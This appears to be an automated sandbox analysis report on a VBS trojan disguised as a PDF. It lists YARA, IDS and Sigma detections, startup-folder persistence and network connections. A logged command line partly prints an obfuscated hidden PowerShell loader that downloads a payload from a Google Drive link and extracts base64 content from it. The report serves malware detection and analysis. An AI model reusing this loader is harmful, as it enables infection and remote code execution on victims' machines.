threat_severity.level_description: Severity MEDIUM because it was considered trojan.

crowdsourced_yara_results.description: This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_ids_results.rule_msg: ET INFO Pastebin-like Service Domain in DNS Lookup (paste .ee)
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET INFO Pastebin-like Service Domain in DNS Lookup (paste .ee)"; dns.query; bsize:8; content:"paste.ee"; nocase; reference:url,github.com/lorien/awesome-pastebins; classtype:misc-activity; sid:2054041; rev:1; metadata:affected_product Any, attack_target Client_Endpoint, created_at 2024_06_26, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, updated_at 2024_06_26, reviewed_at 2024_10_04;)

crowdsourced_ids_results.rule_msg: ET POLICY Pastebin-style Service (paste .ee) in TLS SNI
crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET POLICY Pastebin-style Service (paste .ee) in TLS SNI"; flow:established,to_server; tls.sni; content:"paste.ee"; bsize:8; fast_pattern; classtype:policy-violation; sid:2034978; rev:1; metadata:attack_target Client_Endpoint, created_at 2022_01_26, deployment Perimeter, performance_impact Low, signature_severity Informational, updated_at 2022_01_26;)

attributes.magic: Unicode text, UTF-16, little-endian text, with very long lines (363u), with CRLF line terminators

match_context.values: @{RuleName=T1023; Image=C:\Windows\SysWOW64\wscript.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\CJJ.vbs}

sigma_analysis_results.rule_description: Detects when a file with a suspicious extension is created in the startup folder

match_context.values: @{RuleName=T1023; Image=C:\Windows\SysWOW64\wscript.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\CJJ.vbs}

sigma_analysis_results.rule_title: Potential PowerShell Obfuscation Via Reversed Commands
sigma_analysis_results.rule_description: Detects the presence of reversed PowerShell commands in the CommandLine. This is often used as a method of obfuscation by attackers
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command $Codigo = ' [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden -executionpolicy bypass -NoProfile -command "&( $pShoME[4]+$PShomE[34]+'X')(('5QVimageUrl = MVIhttps://drive.google.com/uc?export=download&id=1UyHqwrnXClK'+'BJ3j63Ll1t2StVgGxbSt0 MVI;5QVwebClient = New-Object System.Net.WebCli'+'ent;5QVimageBytes = 5QVwebClient.'+'DownloadData(5QVimageUrl);5QVimageText = [System.Text.Encoding]::UTF8.GetString(5QVimageByte'+'s);5'+'QVstartFlag = MVI<<BASE64_START>>M'+'VI;5QVendFlag =  [TRUNCATED]; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Outbound Network Connection Initiated By Script Interpreter
sigma_analysis_results.rule_description: Detects a script interpreter wscript/cscript opening a network connection to a non-local network. Adversaries may use script to download malicious payloads.

match_context.values: @{SourceIsIpv6=true; DestinationPort=53; Initiated=true; Protocol=udp; SourceIp=c0a8:20e:6600:6900:28b1:ef91:8dc4:ffff; DestinationIsIpv6=true; EventID=3; SourcePort=49271; Image=C:\Windows\System32\WScript.exe; DestinationIp=808:808:efef:efff:0:ff:0:ff}

@{SourceIsIpv6=false; DestinationPort=80; DestinationIp=188.114.97.7; Protocol=tcp; SourceIp=192.168.2.14; DestinationIsIpv6=false; EventID=3; Image=C:\Windows\System32\WScript.exe; SourcePort=49712; Initiated=true}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

sigma_analysis_results.rule_description: A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.

match_context.values: @{RuleName=T1023; Image=C:\Windows\SysWOW64\wscript.exe; TargetFilename=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\CJJ.vbs; EventID=11}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=$Codigo = ' [TRUNCATED]; MessageTotal=1; ScriptBlockId=53f04b0a-9340-4541-9129-8bbbf3978748; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=$Codigo = ' [TRUNCATED]; MessageTotal=1; ScriptBlockId=09f51b66-ca3c-419e-afa2-f7425f25bdd7; Path=; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

sigma_analysis_results.rule_title: Suspicious PowerShell Invocation From Script Engines
sigma_analysis_results.rule_description: Detects suspicious powershell invocations from interpreters or unusual programs

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\george\Desktop\TILES_DENTRO_DE_TERRITORIO_SIN_DECLARAR_PARA_REVISIONpdf.vbs"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command $Codigo = ' [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\wscript.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potential Encoded PowerShell Patterns In CommandLine
sigma_analysis_results.rule_description: Detects specific combinations of encoding methods in PowerShell via the commandline
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

crowdsourced_ai_results.analysis: The provided code implements several functions related to a Windows Management Instrumentation (WMI) or Web Services for Management (WS-Management) client.  The `CreateSession` function establishes a connection to a remote server, handling various authentication methods (Basic, Digest, Kerberos, Negotiate, Certificate, CredSSP), encoding options (UTF-16, UTF-8), and proxy settings.  It allows for specifying connection options like username, password, certificate thumbprint, and timeout.  The `Enumerate` function retrieves data from a remote resource using WQL, Selector, or Association filters, offering options for return types (objects, EPRs, or both) and hierarchy traversal. The code includes helper functions for XML manipulation (`GetElementByXpath`, `GetElementAttributeByXpath`, `GetElementXml`, `GetXmlNs`), string manipulation (`IsIPv6`, `GetRootNodeName`), and parameter parsing (`ProcessParameterHash`).  A significant portion of the code involves rigorous error checking and handling.  The code also performs a GET request to a URL obtained after a string manipulation process, then executes the response text using `ExecuteGlobal`.  The `ProcessInput` function handles input for PUT, CREATE, and INVOKE operations, either from command-line parameters or a specified file, and constructs or modifies XML accordingly.  `CreateAndInitializeResourceLocator` builds and configures a resource locator object using parameters from command-line options. Finally, `ReadStdIn` reads all input from standard input and `IsCScriptEnv` determines the execution environment.  There is obfuscated code involving string reversal and substitution which downloads a file via HTTP GET and executes its contents.
